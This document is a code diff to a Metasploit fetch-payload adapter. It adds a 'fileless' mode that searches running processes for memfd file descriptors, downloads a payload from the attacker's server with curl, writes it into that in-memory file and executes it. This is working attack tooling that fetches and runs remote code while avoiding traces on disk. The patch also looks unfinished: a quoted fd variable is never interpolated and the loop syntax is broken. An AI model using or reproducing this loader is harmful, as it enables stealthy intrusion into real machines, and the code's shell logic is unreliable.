@@ -202,9 +202,17 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _execute_nix
-    cmds = ";chmod +x #{_remote_destination_nix}"
-    cmds << ";#{_remote_destination_nix}&"
-    cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
+    	if datastore['FETCH_DELETE']
+		fd = rand(3..7)
+		#create anonymous file ? -> /proc/$pid/fd/$fd
+		cmds = ';tmpfile=$(mktemp);exec #{fd}<> "$tmpfile"; rm -f "$tmpfile"'
+		
+
+	else
+		cmds = ";chmod +x #{_remote_destination_nix}"
+		cmds << ";#{_remote_destination_nix}&"
+	end
+    #cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
     cmds
   end
 
@@ -222,6 +230,44 @@ module Msf::Payload::Adapter::Fetch
     end
     cmd + _execute_add
   end
+   
+  def _generate_fileless
+	
+	case fetch_protocol
+	when 'HTTP'
+	      	get_file_cmd = "curl http://#{download_uri}"
+	when 'HTTPS'
+	     	get_file_cmd = "curl https://#{download_uri}"
+	when 'TFTP'
+	      	get_file_cmd = "curl tftp://#{download_uri}"
+	else
+	      	fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+	end
+	
+	#get list of all $USER's processes
+	cmd = "FOUND=0"
+	cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
+	#already found anonymous file where we can write
+	cmd << "; do if [[ $FOUND -eq 0 ]]"
+	
+	#look for every symbolic link with write rwx permissions 
+	#if found one, try to download payload into the anonymous file
+	#and execute it
+	cmd << "; then while read f"
+	cmd << "; do if [[ $(ls -al $f | grep -o memfd | wc -l) == 1 ]]"
+	cmd << "; then #{get_file_cmd} > $f"
+	cmd << "; $f"
+	cmd << "; FOUND=1"
+	cmd << "; break"
+	cmd << "; fi"
+	cmd << "; done <<< $(find /proc/$i/fd -type l -perm u=rwx)"
+	cmd << ";fi"
+	cmd << "done"
+	
+	cmd
+	
+end		
+	
 
   def _generate_curl_command
     case fetch_protocol
